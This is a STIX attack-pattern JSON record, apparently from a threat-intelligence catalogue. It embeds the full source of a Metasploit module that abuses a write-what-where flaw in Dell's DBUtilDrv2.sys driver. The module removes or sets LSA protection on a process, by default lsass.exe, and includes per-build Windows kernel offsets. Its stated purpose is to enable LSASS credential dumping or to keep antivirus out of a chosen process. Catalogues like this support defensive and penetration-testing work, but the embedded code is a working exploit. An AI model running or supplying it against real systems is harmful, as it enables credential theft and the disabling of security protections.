{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e47bcaa6-30cb-467d-baf0-102dc0b48c0a",
    "created": "2024-08-14T16:33:04.979811Z",
    "modified": "2024-08-14T16:33:04.979814Z",
    "name": "Dell DBUtilDrv2.sys Memory Protection Modifier",
    "description": " The Dell DBUtilDrv2.sys drivers version 2.5 and 2.7 have a write-what-where condition that allows an attacker to read and write arbitrary kernel-mode memory. This module installs the provided driver, enables or disables LSA protection on the provided PID, and then removes the driver. This would allow, for example, dumping LSASS memory even when secureboot is enabled or preventing antivirus from accessing the memory of a chosen PID.  The affected drivers are not distributed with Metasploit. You will truly need to Bring Your Own (Dell) Driver.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/dell_memory_protect.rb",
            "external_id": "dell_memory_protect.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2021/12/13/driver-based-attacks-past-and-present/"
        },
        {
            "source_name": "reference",
            "url": "https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection"
        },
        {
            "source_name": "reference",
            "url": "https://itm4n.github.io/lsass-runasppl/"
        },
        {
            "source_name": "reference",
            "url": "https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/assessments/12d7b263-3684-4442-812e-dc30b93def93"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/RedCursorSecurityConsulting/PPLKiller"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/jbaines-r7/dellicious"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  Rank = ManualRanking\n\n  include Msf::Exploit::Local::WindowsKernel\n  include Msf::Post::File\n  include Msf::Post::Process\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Dell DBUtilDrv2.sys Memory Protection Modifier',\n        'Description' => %q{\n          The Dell DBUtilDrv2.sys drivers version 2.5 and 2.7 have a write-what-where condition\n          that allows an attacker to read and write arbitrary kernel-mode memory. This module\n          installs the provided driver, enables or disables LSA protection on the provided\n          PID, and then removes the driver. This would allow, for example, dumping LSASS memory\n          even when secureboot is enabled or preventing antivirus from accessing the memory of\n          a chosen PID.\n\n          The affected drivers are not distributed with Metasploit. You will truly need to\n          Bring Your Own (Dell) Driver.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'SentinelLabs', # Vulnerability discovery in original Dell driver (dbutil_2_3.sys)\n          'Kasif Dekel',  # (from SentinelLabs) blog with detailed analysis\n          'Red Cursor',   # Authors of PPLKiller\n          'Jacob Baines'  # first reference of incomplete patch, poc, & metasploit module\n        ],\n        'Platform' => 'win',\n        'SessionTypes' => [ 'meterpreter' ],\n        'References' => [\n          [ 'URL', 'https://www.rapid7.com/blog/post/2021/12/13/driver-based-attacks-past-and-present/'],\n          [ 'URL', 'https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection'],\n          [ 'URL', 'https://itm4n.github.io/lsass-runasppl/'],\n          [ 'URL', 'https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/' ],\n          [ 'URL', 'https://attackerkb.com/assessments/12d7b263-3684-4442-812e-dc30b93def93'],\n          [ 'URL', 'https://github.com/RedCursorSecurityConsulting/PPLKiller'],\n          [ 'URL', 'https://github.com/jbaines-r7/dellicious' ]\n        ],\n        'Notes' => {\n          'Reliability' => [ ],\n          'Stability' => [ CRASH_OS_RESTARTS ],\n          'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ]\n        }\n      )\n    )\n    register_options([\n      OptString.new('DRIVER_PATH', [true, 'The path containing the driver inf, cat, and sys (and coinstaller)', '']),\n      OptInt.new('PID', [true, 'The targetted process. If set to 0 the module will automatically target lsass.exe', '0']),\n      OptBool.new('ENABLE_MEM_PROTECT', [true, 'Enable or disable memory protection', 'false'])\n    ])\n  end\n\n  def get_eproc_offsets\n    unless session.platform == 'windows'\n      print_status(\"Target is not Windows. Found #{session.platform}\")\n      return nil\n    end\n\n    version = get_version_info\n    vprint_status(\"Windows Build Number = #{version.build_number}\")\n\n    # UniqueProcessIdOffset, ActiveProcessLinksOffset, SignatureLevelOffset\n    offsets = {\n      Msf::WindowsVersion::Win10_1507 => [ 0x02e8, 0x02f0, 0x06a8 ], # Gold\n      Msf::WindowsVersion::Win10_1511 => [ 0x02e8, 0x02f0, 0x06b0 ], # 2015 update\n      Msf::WindowsVersion::Win10_1607 => [ 0x02e8, 0x02f0, 0x06c8 ], # 2016 update\n      Msf::WindowsVersion::Win10_1703 => [ 0x02e0, 0x02e8, 0x06c8 ], # April 2017 update\n      Msf::WindowsVersion::Win10_1709 => [ 0x02e0, 0x02e8, 0x06c8 ], # Fall 2017 update\n      Msf::WindowsVersion::Win10_1803 => [ 0x02e0, 0x02e8, 0x06c8 ], # April 2018 update\n      Msf::WindowsVersion::Win10_1809 => [ 0x02e0, 0x02e8, 0x06c8 ], # October 2018 update\n      Msf::WindowsVersion::Win10_1903 => [ 0x02e8, 0x02f0, 0x06f8 ], # May 2019 update\n      Msf::WindowsVersion::Win10_1909 => [ 0x02e8, 0x02f0, 0x06f8 ], # November 2019 update\n      Msf::WindowsVersion::Win10_2004 => [ 0x0440, 0x0448, 0x0878 ], # May 2020 update\n      Msf::WindowsVersion::Win10_20H2 => [ 0x0440, 0x0448, 0x0878 ], # October 2020 update\n      Msf::WindowsVersion::Win10_21H1 => [ 0x0440, 0x0448, 0x0878 ], # May 2021 update\n      Msf::WindowsVersion::Win10_21H2 => [ 0x0440, 0x0448, 0x0878 ], # October 2021 update\n      Msf::WindowsVersion::Win11_21H2 => [ 0x0440, 0x0448, 0x0878 ]  # Win 11 June/September 2021\n    }\n\n    unless offsets.key?(version.build_number)\n      print_status(\"Unknown offsets for Windows build #{version.build_number}\")\n      return nil\n    end\n\n    return offsets[version.build_number]\n  end\n\n  def run\n    unless is_system?\n      fail_with(Failure::None, 'Elevated session is required')\n    end\n\n    offsets = get_eproc_offsets\n    if offsets.nil?\n      fail_with(Failure::NoTarget, 'Unsupported target')\n    end\n\n    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')\n    end\n\n    unless datastore['DRIVER_PATH'].include? '\\\\'\n      fail_with(Failure::BadConfig, \"The driver path must be a file path. User provided: #{datastore['DRIVER_PATH']}\")\n    end\n\n    # If the user doesn't select a PID select lsass.exe for them\n    target_pid = datastore['PID']\n    if target_pid == 0\n      target_pid = pidof('lsass.exe').first\n      print_status(\"Set PID option #{target_pid} for lsass.exe\")\n    end\n\n    params = datastore['DRIVER_PATH']\n    params += ','\n    params += target_pid.to_s\n    params += ','\n    params += (datastore['ENABLE_MEM_PROTECT'] ? '1' : '0')\n    params += ','\n    params += offsets[0].to_s # UniqueProcessIdOffset\n    params += ','\n    params += offsets[1].to_s # ActiveProcessLinksOffset\n    params += ','\n    params += offsets[2].to_s # SignatureLevelOffset\n\n    execute_dll(::File.join(Msf::Config.data_directory, 'exploits', 'dell_protect', 'dell_protect.x64.dll'), params)\n\n    print_good('Exploit finished')\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}